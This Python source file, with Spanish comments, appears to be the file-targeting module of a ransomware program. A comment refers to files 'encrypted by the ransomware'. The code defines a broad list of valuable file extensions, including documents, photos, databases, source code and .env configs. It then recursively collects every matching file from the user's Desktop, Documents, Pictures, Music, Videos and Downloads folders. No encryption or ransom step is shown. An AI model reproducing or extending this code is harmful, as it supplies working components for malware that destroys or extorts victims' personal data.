import os

def is_important_file(file):
    extensions = { 
        'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico', '.heif', '.heic'],
        'videos': ['.mp4', '.avi', '.mov', '.mkv', '.webm', '.flv', '.wmv', '.3gp', '.mpeg', '.mpg'],
        'music': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff', '.alac'],
        'documents': ['.pdf', '.doc', '.docx', '.odt', '.txt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.md'],
        'databases': ['.db', '.sqlite', '.sql', '.mdb', '.accdb', '.json', '.xml'],
        'compressed_files': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.bz2', '.xz', '.cab'],
        'executable_files': ['.msi', '.bat', '.sh', '.apk', '.jar', '.bin', '.deb', '.rpm'],
        'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
        'configuration_files': ['.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
        'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
        'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware (descifrado)
    }
    # Extraer extensión del archivo
    _, extension = os.path.splitext(file) 
    # Verificar si la extensión del archivo está presente en alguna de las listas dentro del diccionario de extensiones
    is_important = any(extension.lower() in ext_list for ext_list in extensions.values())
    # Devolver True o False 
    return is_important

# Obtiene archivos importantes desde directorios específicos del usuario 
def find_files(): 
    # Obtiene el directorio del usuario desde la variable de entorno 'USERPROFILE'
    user_directory = os.environ.get('USERPROFILE', None)
    # Lista de directorios objetivo para buscar los archivos
    target_directories = [
        os.path.join(user_directory, 'Desktop'), # Directorio de escritorio
        os.path.join(user_directory, 'Pictures'), # Directorio de imágenes
        os.path.join(user_directory, 'Documents'), # Directorio de documentos
        os.path.join(user_directory, 'Music'), # Directorio de música
        os.path.join(user_directory, 'Videos'), # Directorio de vídeos
        os.path.join(user_directory, 'Downloads') # Directorio de descargas
    ]
    # Llama a la función walk_directories con los directorios objetivo
    files = walk_directories(target_directories)
    # Devuelve la lista de archivos encontrados
    return files

# Escanea recursivamente múltiples directorios y devuelve los archivos importantes
def walk_directories(target_directories):  
    important_files = []  # Lista para almacenar los archivos importantes encontrados
    for directory in target_directories:  # Itera sobre cada directorio en la lista de directorios objetivo
            for root, _, files in os.walk(directory):  # Recorre el directorio de manera recursiva
                for file in files:  # Itera sobre los archivos en el directorio actual
                    if is_important_file(file):  # Verifica si el archivo es importante
                        # Agrega la ruta absoluta del archivo importante a la lista
                        important_files.append(os.path.join(root, file))  
    return important_files  # Devuelve una lista con las rutas absolutas de los archivos importantes


